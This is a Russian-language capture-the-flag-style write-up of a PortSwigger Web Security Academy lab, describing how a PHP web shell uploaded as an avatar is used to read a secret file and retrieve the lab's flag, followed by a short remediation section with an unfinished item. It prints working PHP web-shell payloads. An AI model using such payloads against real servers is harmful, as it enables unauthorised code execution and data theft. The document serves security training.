# Remote Code Execution via Web Shell Upload

**Платформа:** PortSwigger Web Security Academy  
**Категория:** Web / File Upload Vulnerabilities  
**Уровень:** Apprentice  
**Дата:** 22.10.2026  
**Статус:** ✅ Solved  
**Ссылка:** https://0ab4000804bc34268435c2af008300c1.web-security-academy.net/

---

## 1. Objective
Требуется загрузить простой PHP-веб-шелл и использовать его для получения содержимого файла /home/carlos/secret

## 2. Reconnaissance
- Были даны логи и пароль от аккаунта wiener:peter, залогинился
- Во вкладке с аккаунтом нашел кнопку 'Upload' для аватара
- Загрузил случайный файл (не картинку), все успешно
- Через DevTools нашел путь, в котором сохраняется аватарка '/files/avatars/...'

## 3. Exploitation

### Шаг 1: Создание и загрузка web shell
1. Создал php-файл, чтобы проверить запускает ли сайт php-файлы и загрузил его 

```php
   '<?php echo "Hello world"; ?>'
```
2. Перешел по эндпоинту загруженного файла 'https://0aec005903c5388a802e6c58000d00ec.web-security-academy.net/files/avatars/exploit.php' и сайт вернул мне 'Hello world'
3. Изменил содержимое exploit.php на '<?php echo file_get_contents('/home/carlos/secret'); ?>' и загрузил его через вкладку 'my-account'
4. Перейдя по эндпоинту получил флаг 'oO1guZv4Xla9vZt4kKjZNeF3zhlZVObI'

**Payloads:**
```text
Тестовый shell: <?php echo "Hello world"; ?>
Финальный shell: <?php echo file_get_contents('/home/carlos/secret'); ?>
URL для выполнения: (https://0aec005903c5388a802e6c58000d00ec.web-security-academy.net/files/avatars/exploit.php))
```

**Почему это сработало:**  
Сервер выполнил PHP-код, потому что не проверяет расширения файла на server-side. С помощью простого кода загруженного под видом аватарки, мы заставили сайт выполнить содержащуюся команду локально у себя, в последствии чего завладели данными

## 4. Result
Флаг найден, лабораторная работа решена

## 5. Key Takeaway & Remediation

**Что я узнал:**  
При добавлении возможности загружать файлы на сервер, обязательно надо обеспечить строгую валидацию файлов, дабы не допустить загрузки вредоносов на сервер

**Как защитить:**
1. Обязательная валидация файлов
2. [Что еще можно сделать, чтобы предотвратить выполнение загруженных файлов?]
